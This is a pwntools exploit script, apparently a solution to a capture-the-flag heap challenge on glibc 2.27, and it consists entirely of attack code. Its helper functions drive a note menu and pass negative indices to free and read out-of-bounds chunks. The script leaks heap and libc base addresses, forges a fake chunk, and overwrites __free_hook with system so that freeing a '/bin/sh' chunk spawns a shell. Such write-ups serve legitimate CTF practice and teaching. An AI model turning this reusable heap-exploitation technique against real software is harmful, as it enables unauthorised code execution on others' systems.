from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('./libc-2.27.so')
#elf = ELF('./')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./chall')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]

def new(size):
    io.sendlineafter(b"> ",str(1).encode())
    size = int(hex(size),16)
    io.sendlineafter(b"size: ",str(size).encode())

def delete(idx):
    io.sendlineafter(b"> ",str(2).encode())
    io.sendlineafter(b"idx: ",str(idx).encode())

def show(idx):
    io.sendlineafter(b"> ",str(3).encode())
    io.sendlineafter(b"idx: ",str(idx).encode())

def edit(idx,content):
    io.sendlineafter(b"> ",str(4).encode())
    io.sendlineafter(b"idx: ",str(idx).encode())
    io.sendafter(b"content: ",content)

new(0x78)
new(0x78)
new(0x78)
new(0x78)
new(0x78)
new(0x78)
new(0x78)
new(0x78)
new(0x78)
delete(-4294967278) # 0xffffffff00000012
delete(-4294967258) # 0xffffffff00000026
new(0x78)
#p()
show(9)
heap_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x310
success("heap_base  -->" + hex(heap_base))

# fake chunk
fakechunk = p64(0) + p64(0x431) + p64(0)*5 + p64(0x21) + p64(heap_base + 0x3c0) + p64(0x428) + p64(heap_base + 0x3f0)
fakechunk += p64(heap_base + 0x3c0) + p64(heap_base + 0x408)
edit(9, fakechunk)
#p()
delete(-4294967244) # 0xffffffff-00000034
show(-4294967242) # 0xffffffff-00000036
libc_base = u64(io.recv(6).ljust(8, b'\x00')) -  0x3ebca0
success("libc_base  -->" + hex(libc_base))
#p()
new(0x80)
#p()
payload = p64(0) * 5 + p64(0x21) + p64(libc_base + 0x3ed8e8) # free_hook
edit(10, payload)
edit(10, p64(libc_base + 0x4f420)) # system
#p()
edit(3,b'/bin/sh\x00')
delete(3)

io.interactive()

